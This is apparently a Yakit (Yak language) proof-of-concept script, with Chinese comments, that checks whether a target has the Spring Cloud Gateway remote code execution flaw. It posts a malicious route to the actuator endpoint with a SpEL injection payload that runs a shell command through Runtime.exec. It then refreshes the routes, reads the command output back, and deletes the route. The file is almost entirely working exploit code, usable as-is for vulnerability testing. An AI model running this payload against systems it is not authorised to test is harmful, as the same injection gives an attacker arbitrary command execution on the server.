log.setLevel("info")  // 设置日志级别
yakit.AutoInitYakit()
//生成随机的路由
randomStr = str.RandStr(4)

yakit.SetProgress(0.2)
yakit.Info("开始接受参数")

target = cli.String("target")
if target == "" {
    die("no target")
    yakit.Error("接受参数失败")
}

// 添加路由
addRoute = func(target,randomStr) {
    return poc.HTTP(`POST /actuator/gateway/routes/{{params(route)}} HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
Content-Type: application/json


{
  "id": "{{params(route)}}",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://{{params(route)}}.com"
}`,
        poc.params({
            "route" :randomStr,
            "target": target,
        }),
    )
}

addRouteRsp,addRouteReq,err = addRoute(target,randomStr)
addRouteHttpRsp,err = poc.ParseBytesToHTTPResponse(addRouteRsp)
die(err)

if err !=nil || addRouteHttpRsp.StatusCode!=201 {
    log.error("添加路由失败,不存在Spring Cloud Gateway 远程代码执行漏洞")
    yakit.Error("添加路由失败,不存在Spring Cloud Gateway 远程代码执行漏洞")
    yakit.SetProgress(1)
    die(err)
}else{
    log.info("添加路由成功，路由为%v", randomStr)
    yakit.SetProgress(0.4)
    yakit.Info("添加路由成功，路由为%v", randomStr)
}

//刷新路由
refeshRoute = func(target) {
    return poc.HTTP(`POST /actuator/gateway/refresh HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded`,
        poc.params({
            "target": target,
        }),
    )
}

refeshRouteRsp,_, err = refeshRoute(target)
refeshRouteHttpRsp,err = poc.ParseBytesToHTTPResponse(refeshRouteRsp)
die(err)

if err !=nil || refeshRouteHttpRsp.StatusCode!=200 {
    log.error("刷新路由失败,不存在Spring Cloud Gateway 远程代码执行漏洞")
    yakit.Error("刷新路由失败,不存在Spring Cloud Gateway 远程代码执行漏洞")
    yakit.SetProgress(1)
    die(err)
}else{
    log.info("刷新路由成功")
    yakit.SetProgress(0.6)
    yakit.Info("刷新路由成功")
}

//获取结果
getRoute = func(target) {
    return poc.HTTP(`GET /actuator/gateway/routes/{{params(route)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded`,
        poc.params({
            "route":randomStr,
            "target": target,
        }),
    )
}

getRouteRsp,getRoutereq, err = getRoute(target)

if err !=nil {
    log.error("获取结果失败")
    yakit.Error("不存在Spring Cloud Gateway 远程代码执行漏洞")
    yakit.SetProgress(1)
    die(err)
}
if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, getRouteRsp) {
    log.info("存在Spring Cloud Gateway 远程代码执行漏洞")
    yakit.Info("存在Spring Cloud Gateway 远程代码执行漏洞，开始清理路由")
    die(err)
    yakit.SetProgress(0.8)
    time.sleep(1)
    
    //清理路由
    delRoute = func(target,randomStr) {
        return poc.HTTP(`DELETE /actuator/gateway/routes/{{params(route)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded`,
            poc.params({
                "route" :randomStr,
                "target": target,
            }),
        )
    }

    delRouteRsp,delRouteReq,err = delRoute(target,randomStr)
    delRouteHttpRsp,err = poc.ParseBytesToHTTPResponse(delRouteRsp)

    if err !=nil || delRouteHttpRsp.StatusCode!=200 {
        log.error("删除路由失败")
        yakit.Error("删除路由失败")
        yakit.SetProgress(1)
        die(err)
    }else{
        log.info("删除路由成功，路由为%v", randomStr)
        yakit.SetProgress(0.9)
        yakit.Info("删除路由成功，路由为%v", randomStr)
    }

    //刷新路由
    refeshRouteRsp2,_, err = refeshRoute(target)
    refeshRouteHttpRsp2,err = poc.ParseBytesToHTTPResponse(refeshRouteRsp2)
    die(err)

    if err !=nil || refeshRouteHttpRsp2.StatusCode!=200 {
        log.error("刷新路由失败")
        yakit.Error("刷新路由失败")
        yakit.SetProgress(1)
        die(err)
    }else{
        log.info("刷新路由成功")
        yakit.SetProgress(1)
        yakit.Info("刷新路由成功")
    }
}